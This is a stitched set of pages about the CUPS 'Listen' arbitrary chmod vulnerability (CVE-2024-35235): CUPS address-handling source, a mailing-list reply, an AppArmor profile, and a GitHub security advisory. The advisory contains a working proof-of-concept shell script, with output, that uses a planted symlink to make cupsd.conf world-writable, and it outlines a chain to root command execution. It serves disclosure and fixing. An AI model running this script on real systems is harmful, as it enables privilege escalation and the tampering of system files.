 snprintf(s, slen, "%d.%d.%d.%d", (temp >> 24) & 255, (temp >> 16) & 255, (temp >> 8) & 255, temp & 255); }#ifdef AF\_INET6 else if (addr->addr.sa\_family == AF\_INET6) { char \*sptr, // Pointer into string temps[64]; // Temporary string for address
 if (getnameinfo(&addr->addr, (socklen\_t)httpAddrLength(addr), temps, sizeof(temps), NULL, 0, NI\_NUMERICHOST)) { // If we get an error back, then the address type is not supported // and we should zero out the buffer... s[0] = '\0';
 return (NULL); } else if ((sptr = strchr(temps, '%')) != NULL) { // Convert "%zone" to "+zone" to match URI form... \*sptr = '+'; }
 // Add "[v1." and "]" around IPv6 address to convert to URI form. snprintf(s, slen, "[v1.%s]", temps); }#endif // AF\_INET6 else { cupsCopyString(s, "UNKNOWN", slen); }
 DEBUG\_printf("1httpAddrGetString: returning \"%s\"...", s);
 return (s);}
//// 'httpGetAddress()' - Get the address of the connected peer of a connection.//// For connections created with @link httpConnect2@, the address is for the// server. For connections created with @link httpAccept@, the address is for// the client.//// Returns `NULL` if the socket is currently unconnected.//// @since CUPS 2.0/OS 10.10@//
http\_addr\_t \* // O - Connected address or `NULL`httpGetAddress(http\_t \*http) // I - HTTP connection{ if (http) return (http->hostaddr); else return (NULL);}
//// 'httpGetHostByName()' - Lookup a hostname or IPv4 address, and return// address records for the specified name.//// @deprecated@ @exclude all@//
struct hostent \* // O - Host entryhttpGetHostByName(const char \*name) // I - Hostname or IP address{ const char \*nameptr; // Pointer into name unsigned ip[4]; // IP address components \_cups\_globals\_t \*cg = \_cupsGlobals(); // Pointer to library globals
 DEBUG\_printf("httpGetHostByName(name=\"%s\")", name);
 // Avoid lookup delays and configuration problems when connecting // to the localhost address... if (!strcmp(name, "localhost")) name = "127.0.0.1";
 /\* \* This function is needed because some operating systems have a \* buggy implementation of gethostbyname() that does not support \* IP addresses. If the first character of the name string is a \* number, then sscanf() is used to extract the IP components. \* We then pack the components into an IPv4 address manually, \* since the inet\_aton() function is deprecated. We use the \* htonl() macro to get the right byte order for the address. \* \* We also support domain sockets when supported by the underlying \* OS... \*/
#ifdef AF\_LOCAL if (name[0] == '/') { // A domain socket address, so make an AF\_LOCAL entry and return it... cg->hostent.h\_name = (char \*)name; cg->hostent.h\_aliases = NULL; cg->hostent.h\_addrtype = AF\_LOCAL; cg->hostent.h\_length = (int)strlen(name) + 1; cg->hostent.h\_addr\_list = cg->ip\_ptrs; cg->ip\_ptrs[0] = (char \*)name; cg->ip\_ptrs[1] = NULL;
 DEBUG\_puts("1httpGetHostByName: returning domain socket address...");
 return (&cg->hostent); }#endif // AF\_LOCAL
 for (nameptr = name; isdigit(\*nameptr & 255) || \*nameptr == '.'; nameptr ++);
 if (!\*nameptr) { // We have an IPv4 address; break it up and provide the host entry // to the caller. if (sscanf(name, "%u.%u.%u.%u", ip, ip + 1, ip + 2, ip + 3) != 4) return (NULL); // Must have 4 numbers
 if (ip[0] > 255 || ip[1] > 255 || ip[2] > 255 || ip[3] > 255) return (NULL); // Invalid byte ranges!
 cg->ip\_addr = htonl((ip[0] << 24) | (ip[1] << 16) | (ip[2] << 8) | ip[3]);
 // Fill in the host entry and return it... cg->hostent.h\_name = (char \*)name; cg->hostent.h\_aliases = NULL; cg->hostent.h\_addrtype = AF\_INET; cg->hostent.h\_length = 4; cg->hostent.h\_addr\_list = cg->ip\_ptrs; cg->ip\_ptrs[0] = (char \*)&(cg->ip\_addr); cg->ip\_ptrs[1] = NULL;
 DEBUG\_puts("1httpGetHostByName: returning IPv4 address...");
 return (&cg->hostent); } else { // Use the gethostbyname() function to get the IPv4 address for the name... DEBUG\_puts("1httpGetHostByName: returning domain lookup address(es)...");
 return (gethostbyname(name)); }}
//// 'httpGetHostname()' - Get the FQDN for the connection or local system.//// When "http" points to a connected socket, return the hostname or// address that was used in the call to httpConnect() or httpConnectEncrypt(),// or the address of the client for the connection from httpAcceptConnection().// Otherwise, return the FQDN for the local system using both gethostname()// and gethostbyname() to get the local hostname with domain.//// @since CUPS 1.2/macOS 10.5@//
const char \* // O - FQDN for connection or systemhttpGetHostname(http\_t \*http, // I - HTTP connection or NULL char \*s, // I - String buffer for name int slen) // I - Size of buffer{ if (http) { if (!s || slen <= 1) { if (http->hostname[0] == '/') return ("localhost"); else return (http->hostname); } else if (http->hostname[0] == '/') { cupsCopyString(s, "localhost", (size\_t)slen); } else { cupsCopyString(s, http->hostname, (size\_t)slen); } } else { // Get the hostname... if (!s || slen <= 1) return (NULL);
 if (gethostname(s, (size\_t)slen) < 0) cupsCopyString(s, "localhost", (size\_t)slen);
 if (!strchr(s, '.')) {#ifdef HAVE\_SCDYNAMICSTORECOPYCOMPUTERNAME // The hostname is not a FQDN, so use the local hostname from the // SystemConfiguration framework... SCDynamicStoreRef sc = SCDynamicStoreCreate(kCFAllocatorDefault, CFSTR("libcups"), NULL, NULL); // System configuration data CFStringRef local = sc ? SCDynamicStoreCopyLocalHostName(sc) : NULL; // Local host name char localStr[1024]; // Local host name C string
 if (local && CFStringGetCString(local, localStr, sizeof(localStr), kCFStringEncodingUTF8)) { // Append ".local." to the hostname we get... snprintf(s, (size\_t)slen, "%s.local.", localStr); }
 if (local) CFRelease(local); if (sc) CFRelease(sc);
#else // The hostname is not a FQDN, so look it up... struct hostent \*host; // Host entry to get FQDN
 if ((host = gethostbyname(s)) != NULL && host->h\_name) { // Use the resolved hostname... cupsCopyString(s, host->h\_name, (size\_t)slen); }#endif // HAVE\_SCDYNAMICSTORECOPYCOMPUTERNAME }
 // Make sure .local hostnames end with a period... if (strlen(s) > 6 && !strcmp(s + strlen(s) - 6, ".local")) cupsConcatString(s, ".", (size\_t)slen); }
 // Convert the hostname to lowercase as needed... if (s[0] != '/') { char \*ptr; // Pointer into string
 for (ptr = s; \*ptr; ptr ++) \*ptr = (char)\_cups\_tolower((int)\*ptr); }
 // Return the hostname with as much domain info as we have... return (s);}
//// 'httpResolveHostname()' - Resolve the hostname of the HTTP connection// address.//// @since CUPS 2.0/OS 10.10@//
const char \* // O - Resolved hostname or `NULL`httpResolveHostname(http\_t \*http, // I - HTTP connection char \*buffer, // I - Hostname buffer size\_t bufsize) // I - Size of buffer{ if (!http) return (NULL);
 if (isdigit(http->hostname[0] & 255) || http->hostname[0] == '[') { char temp[1024]; // Temporary string
 if (httpAddrLookup(http->hostaddr, temp, sizeof(temp))) cupsCopyString(http->hostname, temp, sizeof(http->hostname)); else return (NULL); }
 if (buffer) { if (http->hostname[0] == '/') cupsCopyString(buffer, "localhost", bufsize); else cupsCopyString(buffer, http->hostname, bufsize);
 return (buffer); } else if (http->hostname[0] == '/') { return ("localhost"); } else { return (http->hostname); }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_df2f753f_20250111_071734.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](5) [[<thread-prev]](../../../2024/06/11/1) [[thread-next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <v4d8ln$2ut$1@ciao.gmane.io>
Date: Wed, 12 Jun 2024 22:49:28 -0000 (UTC)
From: Tavis Ormandy <taviso@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-35235 cups: Cupsd Listen arbitrary chmod 0140777

On 2024-06-11, Zdenek Dohnal wrote:
>  ???????? Impact
>
> Given that cupsd is often running as root, this can result in the change
> of permission of any user or system files to be world writable.
>
>
> <https://github.com/OpenPrinting/cups/commit/a436956f3>
>

This is a pretty confusing description... if we accept the premise that an
attacker can somehow get root to run cupsd with a modified configuration
file (how???), then this patch doesn't seem sufficient. They can still
get root to unlink() an arbitrary file, no?

I guess someone from CUPS has seen a working Ubuntu exploit that did
this, but this really feels like fixing the bug in the wrong place?

Tavis.

--
 _o)            $ lynx lock.cmpxchg8b.com
 /\\  _o)  _o)  $ finger taviso@....org
_\_V _( ) _( )  @taviso

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from git.launchpad.net_a5b34312_20250111_071736.html ===


| [cgit logo](/) | [index](/) : [ubuntu/+source/apparmor](/ubuntu/%2Bsource/apparmor/ "ubuntu/+source/apparmor") | applied/debian/bookworm applied/debian/bullseye applied/debian/buster applied/debian/experimental applied/debian/jessie applied/debian/sid applied/debian/stretch applied/debian/wheezy applied/ubuntu/artful applied/ubuntu/artful-devel applied/ubuntu/artful-proposed applied/ubuntu/artful-updates applied/ubuntu/bionic applied/ubuntu/bionic-devel applied/ubuntu/bionic-proposed applied/ubuntu/bionic-security applied/ubuntu/bionic-updates applied/ubuntu/cosmic applied/ubuntu/cosmic-devel applied/ubuntu/cosmic-proposed applied/ubuntu/devel applied/ubuntu/disco applied/ubuntu/disco-devel applied/ubuntu/disco-proposed applied/ubuntu/disco-updates applied/ubuntu/eoan applied/ubuntu/eoan-devel applied/ubuntu/eoan-proposed applied/ubuntu/feisty applied/ubuntu/feisty-devel applied/ubuntu/focal applied/ubuntu/focal-devel applied/ubuntu/focal-proposed applied/ubuntu/focal-security applied/ubuntu/focal-updates applied/ubuntu/groovy applied/ubuntu/groovy-devel applied/ubuntu/groovy-proposed applied/ubuntu/gutsy applied/ubuntu/gutsy-devel applied/ubuntu/hardy applied/ubuntu/hardy-devel applied/ubuntu/hardy-proposed applied/ubuntu/hardy-updates applied/ubuntu/hirsute applied/ubuntu/hirsute-devel applied/ubuntu/hirsute-proposed applied/ubuntu/hirsute-updates applied/ubuntu/impish applied/ubuntu/impish-devel applied/ubuntu/impish-proposed applied/ubuntu/intrepid applied/ubuntu/intrepid-devel applied/ubuntu/intrepid-proposed applied/ubuntu/intrepid-updates applied/ubuntu/jammy applied/ubuntu/jammy-devel applied/ubuntu/jammy-proposed applied/ubuntu/jammy-security applied/ubuntu/jammy-updates applied/ubuntu/jaunty applied/ubuntu/jaunty-devel applied/ubuntu/karmic applied/ubuntu/karmic-devel applied/ubuntu/karmic-proposed applied/ubuntu/karmic-security applied/ubuntu/karmic-updates applied/ubuntu/kinetic applied/ubuntu/kinetic-devel applied/ubuntu/kinetic-proposed applied/ubuntu/lucid applied/ubuntu/lucid-devel applied/ubuntu/lucid-proposed applied/ubuntu/lucid-security applied/ubuntu/lucid-updates applied/ubuntu/lunar applied/ubuntu/lunar-devel applied/ubuntu/lunar-proposed applied/ubuntu/lunar-updates applied/ubuntu/mantic applied/ubuntu/mantic-devel applied/ubuntu/mantic-proposed applied/ubuntu/maverick applied/ubuntu/maverick-devel applied/ubuntu/maverick-proposed applied/ubuntu/maverick-security applied/ubuntu/maverick-updates applied/ubuntu/natty applied/ubuntu/natty-devel applied/ubuntu/natty-security applied/ubuntu/natty-updates applied/ubuntu/noble applied/ubuntu/noble-devel applied/ubuntu/noble-proposed applied/ubuntu/noble-updates applied/ubuntu/oneiric applied/ubuntu/oneiric-devel applied/ubuntu/oneiric-security applied/ubuntu/oneiric-updates applied/ubuntu/oracular applied/ubuntu/oracular-devel applied/ubuntu/oracular-proposed applied/ubuntu/plucky applied/ubuntu/plucky-devel applied/ubuntu/plucky-proposed applied/ubuntu/precise applied/ubuntu/precise-devel applied/ubuntu/precise-proposed applied/ubuntu/precise-security applied/ubuntu/precise-updates applied/ubuntu/quantal applied/ubuntu/quantal-devel applied/ubuntu/quantal-proposed applied/ubuntu/quantal-updates applied/ubuntu/raring applied/ubuntu/raring-devel applied/ubuntu/raring-proposed applied/ubuntu/saucy applied/ubuntu/saucy-devel applied/ubuntu/saucy-proposed applied/ubuntu/saucy-updates applied/ubuntu/trusty applied/ubuntu/trusty-devel applied/ubuntu/trusty-proposed applied/ubuntu/trusty-security applied/ubuntu/trusty-updates applied/ubuntu/utopic applied/ubuntu/utopic-devel applied/ubuntu/utopic-proposed applied/ubuntu/vivid applied/ubuntu/vivid-devel applied/ubuntu/vivid-proposed applied/ubuntu/wily applied/ubuntu/wily-devel applied/ubuntu/wily-proposed applied/ubuntu/xenial applied/ubuntu/xenial-devel applied/ubuntu/xenial-proposed applied/ubuntu/xenial-security applied/ubuntu/xenial-updates applied/ubuntu/yakkety applied/ubuntu/yakkety-devel applied/ubuntu/yakkety-proposed applied/ubuntu/yakkety-security applied/ubuntu/yakkety-updates applied/ubuntu/zesty applied/ubuntu/zesty-devel applied/ubuntu/zesty-proposed debian/bookworm debian/bullseye debian/buster debian/experimental debian/jessie debian/sid debian/stretch debian/wheezy importer/debian/dsc importer/debian/pristine-tar importer/ubuntu/dsc importer/ubuntu/pristine-tar ubuntu/artful ubuntu/artful-devel ubuntu/artful-proposed ubuntu/artful-updates ubuntu/bionic ubuntu/bionic-devel ubuntu/bionic-proposed ubuntu/bionic-security ubuntu/bionic-updates ubuntu/cosmic ubuntu/cosmic-devel ubuntu/cosmic-proposed ubuntu/devel ubuntu/disco ubuntu/disco-devel ubuntu/disco-proposed ubuntu/disco-updates ubuntu/eoan ubuntu/eoan-devel ubuntu/eoan-proposed ubuntu/feisty ubuntu/feisty-devel ubuntu/focal ubuntu/focal-devel ubuntu/focal-proposed ubuntu/focal-security ubuntu/focal-updates ubuntu/groovy ubuntu/groovy-devel ubuntu/groovy-proposed ubuntu/gutsy ubuntu/gutsy-devel ubuntu/hardy ubuntu/hardy-devel ubuntu/hardy-proposed ubuntu/hardy-updates ubuntu/hirsute ubuntu/hirsute-devel ubuntu/hirsute-proposed ubuntu/hirsute-updates ubuntu/impish ubuntu/impish-devel ubuntu/impish-proposed ubuntu/intrepid ubuntu/intrepid-devel ubuntu/intrepid-proposed ubuntu/intrepid-updates ubuntu/jammy ubuntu/jammy-devel ubuntu/jammy-proposed ubuntu/jammy-security ubuntu/jammy-updates ubuntu/jaunty ubuntu/jaunty-devel ubuntu/karmic ubuntu/karmic-devel ubuntu/karmic-proposed ubuntu/karmic-security ubuntu/karmic-updates ubuntu/kinetic ubuntu/kinetic-devel ubuntu/kinetic-proposed ubuntu/lucid ubuntu/lucid-devel ubuntu/lucid-proposed ubuntu/lucid-security ubuntu/lucid-updates ubuntu/lunar ubuntu/lunar-devel ubuntu/lunar-proposed ubuntu/lunar-updates ubuntu/mantic ubuntu/mantic-devel ubuntu/mantic-proposed ubuntu/maverick ubuntu/maverick-devel ubuntu/maverick-proposed ubuntu/maverick-security ubuntu/maverick-updates ubuntu/natty ubuntu/natty-devel ubuntu/natty-security ubuntu/natty-updates ubuntu/noble ubuntu/noble-devel ubuntu/noble-proposed ubuntu/noble-updates ubuntu/oneiric ubuntu/oneiric-devel ubuntu/oneiric-security ubuntu/oneiric-updates ubuntu/oracular ubuntu/oracular-devel ubuntu/oracular-proposed ubuntu/plucky ubuntu/plucky-devel ubuntu/plucky-proposed ubuntu/precise ubuntu/precise-devel ubuntu/precise-proposed ubuntu/precise-security ubuntu/precise-updates ubuntu/quantal ubuntu/quantal-devel ubuntu/quantal-proposed ubuntu/quantal-updates ubuntu/raring ubuntu/raring-devel ubuntu/raring-proposed ubuntu/saucy ubuntu/saucy-devel ubuntu/saucy-proposed ubuntu/saucy-updates ubuntu/trusty ubuntu/trusty-devel ubuntu/trusty-proposed ubuntu/trusty-security ubuntu/trusty-updates ubuntu/utopic ubuntu/utopic-devel ubuntu/utopic-proposed ubuntu/vivid ubuntu/vivid-devel ubuntu/vivid-proposed ubuntu/wily ubuntu/wily-devel ubuntu/wily-proposed ubuntu/xenial ubuntu/xenial-devel ubuntu/xenial-proposed ubuntu/xenial-security ubuntu/xenial-updates ubuntu/yakkety ubuntu/yakkety-devel ubuntu/yakkety-proposed ubuntu/yakkety-security ubuntu/yakkety-updates ubuntu/zesty ubuntu/zesty-devel ubuntu/zesty-proposed |
| --- | --- | --- |
| [no description] |  |

| [summary](/ubuntu/%2Bsource/apparmor/)[refs](/ubuntu/%2Bsource/apparmor/refs/)[log](/ubuntu/%2Bsource/apparmor/log/profiles/apparmor.d/abstractions/user-tmp)[tree](/ubuntu/%2Bsource/apparmor/tree/profiles/apparmor.d/abstractions/user-tmp)[commit](/ubuntu/%2Bsource/apparmor/commit/profiles/apparmor.d/abstractions/user-tmp)[diff](/ubuntu/%2Bsource/apparmor/diff/profiles/apparmor.d/abstractions/user-tmp) | log msg author committer range |
| --- | --- |

path: [root](/ubuntu/%2Bsource/apparmor/tree/)/[profiles](/ubuntu/%2Bsource/apparmor/tree/profiles)/[apparmor.d](/ubuntu/%2Bsource/apparmor/tree/profiles/apparmor.d)/[abstractions](/ubuntu/%2Bsource/apparmor/tree/profiles/apparmor.d/abstractions)/[user-tmp](/ubuntu/%2Bsource/apparmor/tree/profiles/apparmor.d/abstractions/user-tmp)blob: 804135fa3b7af672d631925926fe0627250dbcaf ([plain](/ubuntu/%2Bsource/apparmor/plain/profiles/apparmor.d/abstractions/user-tmp))

| ``` [1](#n1) [2](#n2) [3](#n3) [4](#n4) [5](#n5) [6](#n6) [7](#n7) [8](#n8) [9](#n9) [10](#n10) [11](#n11) [12](#n12) [13](#n13) [14](#n14) [15](#n15) [16](#n16) [17](#n17) [18](#n18) [19](#n19) [20](#n20) [21](#n21) [22](#n22) [23](#n23) [24](#n24) [25](#n25)  ``` | ``` # ------------------------------------------------------------------ # #    Copyright (C) 2002-2009 Novell/SUSE #    Copyright (C) 2009-2010 Canonical Ltd. # #    This program is free software; you can redistribute it and/or #    modify it under the terms of version 2 of the GNU General Public #    License published by the Free Software Foundation. # # ------------------------------------------------------------------    abi <abi/4.0>,    # per-user tmp directories   owner @{HOME}/tmp/**  rwkl,   owner @{HOME}/tmp/    rw,    # global tmp directories   owner /var/tmp/**     rwkl,   /var/tmp/             rw,   owner /tmp/**         rwkl,   /tmp/                 rw,    # Include additions to the abstraction   include if exists <abstractions/user-tmp.d>  ``` |
| --- | --- |

generated by [cgit v1.2.3](https://git.zx2c4.com/cgit/about/) ([git 2.25.1](https://git-scm.com/)) at 2025-01-11 07:17:36 +0000



=== Content from github.com_074bfd47_20250111_071738.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fsecurity%2Fadvisories%2FGHSA-vvwp-mv6j-hw6f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fsecurity%2Fadvisories%2FGHSA-vvwp-mv6j-hw6f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=OpenPrinting%2Fcups)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenPrinting](/OpenPrinting)
/
**[cups](/OpenPrinting/cups)**
Public

* [Notifications](/login?return_to=%2FOpenPrinting%2Fcups) You must be signed in to change notification settings
* [Fork
  208](/login?return_to=%2FOpenPrinting%2Fcups)
* [Star
   1.1k](/login?return_to=%2FOpenPrinting%2Fcups)

* [Code](/OpenPrinting/cups)
* [Issues
  27](/OpenPrinting/cups/issues)
* [Pull requests
  11](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects
  0](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

Additional navigation options

* [Code](/OpenPrinting/cups)
* [Issues](/OpenPrinting/cups/issues)
* [Pull requests](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

# Cupsd Listen arbitrary chmod 0140777

Moderate

[zdohnal](/zdohnal)
published
GHSA-vvwp-mv6j-hw6f
Jun 11, 2024

## Package

cupsd

## Affected versions

<=2.4.8

## Patched versions

None

## Description

### Summary

When starting the cupsd server with a Listen configuration item pointing to a symbolic link, the cupsd process can be caused to perform an arbitrary chmod of the provided argument, providing world-writable access to the target.

### Details

This is an excerpt from a larger chain of vulnerabilities reported in Ubuntu 24.04. There is an assumption for exploitation that /etc/cups/cupsd.conf can be successfully edited (this has been omitted here as it is believed to be out of scope).

When setting up the bind for unix sockets configured in the Listen parameters of the configuration file, the code does not check for a successful call to `unlink` and `bind` prior to performing the call to `chmod`. [1]

On Ubuntu 24.04, by setting the Listen argument to a path such as `/tmp/stage/file`, where `file` is a symlink elsewhere in the system, the previous call to `unlink` for the path will fail due to AppArmor [2], and the subsequent call to `bind` will also fail due to the file still existing. The return value of the call to `bind` is not checked before the call to `chmod`, so a successfully planted symbolic link which causes the `bind` to fail will still be traversed by the call to `chmod` and the file permissions changed to be world writable.

On systems where the Ubuntu AppArmor policy is not in place, this vulnerability still exists but as a race condition between the call to `unlink` and the call to `bind`. A sufficiently fast attacker could place a symbolic link at the configured location after the call to `unlink`, causing the `bind` to fail once again and performing a successful `chmod`.

#### Suggested Fix

* Recursively open the configured paths using `openat` with `O_NOFOLLOW`, followed by using `fchmod` in place of `chmod`. This will ensure that there are no unexpected symbolic links in the path.
* Check the return value of the `bind` call before performing the `chmod` to ensure that the file is a socket. This is not perfect but can drastically narrow the race condition window.

[1]

[cups/cups/http-addr.c](https://github.com/OpenPrinting/cups/blob/aba917003c8de55e5bf85010f0ecf1f1ddd1408e/cups/http-addr.c#L229-L240)

Lines 229 to 240
in
[aba9170](/OpenPrinting/cups/commit/aba917003c8de55e5bf85010f0ecf1f1ddd1408e)

|  | unlink(addr->un.sun\_path); |
| --- | --- |
|  |  |
|  | // Save the current umask and set it to 0 so that all users can access |
|  | // the domain socket... |
|  | mask = umask(0); |
|  |  |
|  | // Bind the domain socket... |
|  | status = bind(fd, (struct sockaddr \*)addr, (socklen\_t)httpAddrLength(addr)); |
|  |  |
|  | // Restore the umask and fix permissions... |
|  | umask(mask); |
|  | chmod(addr->un.sun\_path, 0140777); |

[2] [https://git.launchpad.net/ubuntu/+source/apparmor/tree/profiles/apparmor.d/abstractions/user-tmp#n21](https://git.launchpad.net/ubuntu/%2Bsource/apparmor/tree/profiles/apparmor.d/abstractions/user-tmp#n21)
### PoC

The following script can be used for exploitation, sudo is used to emulate the above mentioned Listen configuration access.

```
set -e
exploit() {
        echo "Staging..."
        mkdir -m 777 /tmp/stage
        ln -s /etc/cups/cupsd.conf /tmp/stage/cupsd.conf

        # emulate configuration access to cupsd.conf
        echo 'Listen /tmp/stage/cupsd.conf' | sudo tee -a /etc/cups/cupsd.conf

        echo

        echo "Current permissions of cupsd.conf"
        ls -l /etc/cups/cupsd.conf
        tail -n1 /etc/cups/cupsd.conf || true

        echo

        echo "Restarting cupsd"
        sudo systemctl restart cups

        echo

        echo "New permissions of cupsd.conf"
        ls -l /etc/cups/cupsd.conf
        tail -n1 /etc/cups/cupsd.conf || true
}

cleanup() {
        sudo sed -i '/Listen \/tmp\/stage\/cupsd.conf/d' /etc/cups/cupsd.conf
        sudo chmod 640 /etc/cups/cupsd.conf
        rm -rf /tmp/stage
}

$@

```

Sample output can be seen below:

```
$ sh poc.sh exploit
Staging...
Listen /tmp/stage/cupsd.conf

Current permissions of cupsd.conf
-rw-r----- 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf
tail: cannot open '/etc/cups/cupsd.conf' for reading: Permission denied

Restarting cupsd

New permissions of cupsd.conf
-rwxrwxrwx 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf
Listen /tmp/stage/cupsd.conf
$ sh poc.sh cleanup

```
### Impact

Given that cupsd is often running as root, this can result in the change of permission of any user or system files to be world writable.

Given the aforementioned Ubuntu AppArmor context, on such systems this vulnerability is limited to those files modifiable by the cupsd process. In that specific case it was found to be possible to turn the configuration of the Listen argument into full control over the cupsd.conf and cups-files.conf configuration files. By later setting the User and Group arguments in cups-files.conf, and printing with a printer configured by PPD with a `FoomaticRIPCommandLine` argument, arbitrary user and group (not root) command execution could be achieved, which can further be used on Ubuntu systems to achieve full root command execution.

### Severity

Moderate

4.4

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
High

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

